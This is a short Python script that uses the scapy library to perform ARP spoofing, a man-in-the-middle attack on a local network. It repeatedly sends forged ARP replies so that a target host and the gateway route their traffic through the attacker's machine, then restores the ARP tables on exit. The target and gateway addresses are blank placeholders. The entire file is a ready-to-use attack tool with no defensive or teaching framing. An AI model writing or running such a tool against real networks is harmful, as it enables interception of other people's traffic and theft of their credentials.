import scapy.all as scapy
import time


# pdst is the ip of destination
# hwdst is the mac of destination
# psrc is the current source ip where the packet is coming from 


def get_mac(ip):

    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]

    return answered[0][1].hwsrc


def spoof(target_ip, spoof_ip):

    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(dest_ip, source_ip):
    dest_mac = get_mac(dest_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, count=4, verbose=False)


target_ip = ""
gateway_ip = ""
try:
    send_packets_count = 0
    while True:

        spoof(target_ip, gateway_ip)  # first spoof target
        spoof(gateway_ip, target_ip)  # second spoof router
        print("\r[+] Packets sent : " + str(send_packets_count), end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("[+] Detect CMD + C ...... Resetting ARP Tables..... Please Wait \n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)